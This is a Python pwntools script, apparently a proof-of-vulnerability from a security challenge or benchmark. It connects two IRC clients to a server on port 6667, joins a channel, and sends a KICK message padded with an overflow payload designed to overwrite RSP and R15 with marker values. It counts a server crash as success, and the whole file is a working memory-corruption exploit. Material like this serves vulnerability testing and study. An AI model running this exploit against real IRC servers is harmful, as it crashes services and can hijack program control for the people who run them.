import sys
from pwn import *

def handler( signum, frame):
    print('[SUCCESs] sigalrm fired so the POV was likely successful')
    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    p_bob = remote(HOST, 6667)
   
    print('[INFO] Connecting with bob')

    p_bob.send('NICK bob\n')
    p_bob.send('USER bob bob chess :bob\n')
    p_bob.readuntil('MOTD file is missing')
    p_bob.send('JOIN #hello\n')
    p_bob.readuntil('NAMES list')

    print('[INFO] Connecting with alice')
    p_alice = remote(HOST, 6667)

    p_alice.send('NICK alice\n')
    p_alice.send('USER alice alice chess :alice\n')
    p_alice.readuntil('MOTD file is missing')
    p_alice.send('JOIN #hello\n')
    p_alice.readuntil('NAMES list')

    print('[INFO] Sending KICK')

    bug = 'a'*120
    bug += 'b'*50
    bug += 'c'*6
    bug += '\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa'
    bug += '\xee\xee\xee\xee\xef\xbe\xad\xde' #p64(0xdeadbeefcafebabe)
    bug += 'aaaaaaaa'
    
    p_bob.send('KICK #eatit,#hello aaaa :' + bug + '\n')
    p_bob.readline()
    p_alice.send('PING\r\n')
    
    try:
        print(p_bob.readline())
        print(p_alice.readline())
        print(p_alice.readline())
    except:
        print('[SUCCESS] Failed to read which likely means crash.')
        print('[RSP] = 0xdeadbeefeeeeeeee')
        print('R15 = 0xaaaaaaaaaaaaaaaa')
        exit(0)

    p_alice.close()
    p_bob.close()
    
    print('[FAIL] POV Failed')

if __name__ == '__main__':
    main()
